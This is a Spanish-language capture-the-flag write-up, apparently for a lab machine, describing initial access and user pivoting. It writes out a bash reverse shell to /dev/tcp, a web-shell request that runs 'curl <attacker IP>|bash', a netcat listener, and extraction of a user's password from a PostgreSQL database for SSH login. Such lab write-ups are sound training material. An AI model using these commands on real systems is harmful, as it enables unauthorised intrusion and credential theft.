## Vuln exploit & Gaining Access {-}

### Ganando accesso con la s4vishell.php {-}

1. Creamos un archivo index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.17.51/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cambiamos la url por 
    
    ```bash
    http://10.10.10.114/profile/s4vishell.php?cmd=curl 10.10.17.51|bash
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

Como el **user.txt** del usuario **clave** no es permitido a nivel de lectura por el usuario **www-data** tenemos que convertirnos en el usuario
**clave**.

Aprovechamos el snippet encontrado para ver lo que hay en la base de datos **postgresql**.

```bash
which psql
which php
```

Vemos que la utilidad **psql** no existe en la maquina victima, pero como tenemos acceso a la utilidad **php**, tiramos del `php --interactive`

```bash
php --interactive

$connection = new PDO('pgsql:dbname=profiles;host=localhost', 'profiles', 'profiles');
$connect = $connection->query("select * from profiles");
$results = $connect->fetchAll();
print_r($results);
```

Aqui vemos la contraseña del usuario clave. Parece ser una contraseña en base64.

```bash
echo 'c3NoLXN0cjBuZy1wQHNz==' | base64 -d; echo
#Output
ssh-str0ng-p@ss
```

Intentamos connectarnos con ssh

```bash
ssh clave@10.10.10.114
password: ssh-str0ng-p@ss
```

No nos podemos connectar pero el doble igual nos parece un poco raro. Intentamos otra vez pero con la contraseña tal cual, sin decodificacion base64.

```bash
ssh clave@10.10.10.114
password: c3NoLXN0cjBuZy1wQHNz==
```

Ya podemos conectar y leer la flag.
